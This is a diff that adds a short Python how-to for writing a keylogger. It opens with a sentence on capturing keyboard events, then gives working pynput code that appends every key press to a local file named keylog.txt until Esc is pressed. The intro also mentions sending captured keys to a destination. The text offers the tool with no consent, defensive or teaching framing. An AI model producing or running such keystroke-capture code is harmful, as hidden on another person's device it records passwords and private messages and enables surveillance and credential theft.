@@ -1,0 +1,23 @@
+Writing a keylogger in Python involves using libraries that can capture keyboard events and log them to a file or send them to a specified destination. One popular library for this purpose is pynput.
+
+Here's a basic example of a keylogger using pynput:
+
+python
+
+from pynput.keyboard import Key, Listener
+
+log_file = 'keylog.txt'
+
+def on_press(key):
+    with open(log_file, 'a') as f:
+        f.write('{}\n'.format(key))
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+This script will log all keyboard events to a file named keylog.txt and stop when the Esc key is pressed.
